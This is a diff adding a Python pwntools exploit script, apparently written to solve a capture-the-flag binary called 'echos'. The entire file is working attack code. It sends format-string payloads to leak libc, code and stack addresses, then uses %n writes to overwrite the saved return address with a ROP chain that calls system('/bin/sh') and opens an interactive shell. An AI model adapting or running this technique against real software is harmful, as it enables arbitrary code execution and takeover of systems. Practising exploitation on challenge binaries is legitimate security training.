@@ -1,0 +1,72 @@
+from pwn import *
+#to make sure stack doesnt move around
+io = process("./echos")
+libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
+#Utilities
+def pad(s):
+    return "0" * (6 - len(s)) + s
+
+#leaking libc address,main address and stack address cause they all happen to be on the buffer
+def leakAddresses():
+    exploit = b"%3$lx%6$lx%4$lx"
+    io.sendline(exploit)
+    leakedBytes = io.recv()[:-1]
+    libcLeak = leakedBytes[:12]
+    asmLeak = leakedBytes[12:24]
+    stackLeak = leakedBytes[24:]
+    readInt = int(libcLeak.decode(),16) - 18
+    libcBase = readInt - libc.symbols["read"]
+    mainAddr = int(asmLeak.decode(),16) - 2098555
+    stackRet = int(stackLeak.decode(),16) + 88
+    print("===========================================")
+    print("readAddress = " + hex(readInt))
+    print("libcBase = " + hex(libcBase))
+    print("main = " + hex(mainAddr))
+    print("stackRet = " + hex(stackRet))
+    print("===========================================")
+    ret = [libcBase,mainAddr,stackRet]
+    return ret
+
+#overwrite addresses using format string %n src is overwrite with what ret is whr to overwrite
+def overwrite(dest,src):
+    #must follow order so we dont mess up the bytes we placed
+    converted = hex(src)
+    values = [int(converted[-4:],16),int(converted[-8:-4],16),int(converted[-12:-8],16)]
+    if values[1] < values[0]:
+        values[1] += 0x10000
+
+    if values[2] < values[1]:
+        values[2] += 0x20000
+
+    first = str(values[0])
+    second = str(values[1] - values[0])
+    third = str(values[2] - values[1])
+    exploit = "%{0}lx%14$n%{1}lx%15$n%{2}lx%16$nAAAAAA".format(pad(first),pad(second),pad(third))  #8 + 5 == first
+    exploit = bytes(exploit,'utf-8')
+    exploit += p64(dest) + p64(dest + 2) + p64(dest + 4)
+    return exploit
+
+addresses = leakAddresses()
+libc.address = addresses[0]
+main = addresses[1]
+popRdi = main - 0x81d + 0x8f3
+retAddress = addresses[2]
+binsh = next(libc.search(b"/bin/sh"))
+system = libc.symbols["system"]
+print("popRdi = " + hex(popRdi))
+print("binsh = " + hex(binsh))
+print("system = " + hex(system))
+print("===========================================")
+#overwrite return so we return to main
+exploit1 = overwrite(retAddress,main)
+exploit2 = overwrite(retAddress + 8,popRdi)
+exploit3 = overwrite(retAddress + 16,binsh)
+exploit4 = overwrite(retAddress + 24,system)
+pause()
+io.sendline(exploit1)
+io.sendline(exploit2)
+io.sendline(exploit3)
+io.sendline(exploit4)
+io.sendline("abc")
+print(overwrite(0x7fffffffe2c8,0x000055555555481d))
+io.interactive()
